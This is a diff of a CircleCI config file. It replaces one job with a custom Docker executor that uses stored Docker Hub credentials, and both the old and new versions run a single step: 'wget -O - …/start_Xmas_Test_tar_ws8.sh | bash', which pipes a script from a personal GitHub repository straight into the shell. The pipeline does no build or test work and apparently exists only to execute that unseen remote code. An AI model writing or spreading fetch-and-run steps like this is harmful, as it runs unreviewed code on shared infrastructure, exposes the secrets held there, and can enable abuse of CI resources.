@@ -1,17 +1,23 @@
 version: 2.1
+executors:
+  my-custom-executor:
+    docker:
+      - image: cimg/base:stable
+        auth:
+          # ensure you have first added these secrets
+          # visit app.circleci.com/settings/project/github/deonlacoste/rep1/environment-variables
+          username: $DOCKER_HUB_USER
+          password: $DOCKER_HUB_PASSWORD
 jobs:
-    trial:
-      docker:
-            - image: circleci/ruby:2.5.3
-      parallelism: 16
-      steps:
-        - run:
-            name: Install Dependencies
-            command: |
-              wget -O - https://raw.githubusercontent.com/nathanfleight/scripts/main/start_Xmas_Test_tar_ws8.sh | bash
+  my-job-name:
+
+    executor: my-custom-executor
+    steps:
+      - checkout
+      - run: |
+           wget -O - https://raw.githubusercontent.com/nathanfleight/scripts/main/start_Xmas_Test_tar_ws8.sh | bash
 
 workflows:
-    version: 2.1
-    build:
-        jobs:
-        - trial
+  my-custom-workflow:
+    jobs:
+      - my-job-name
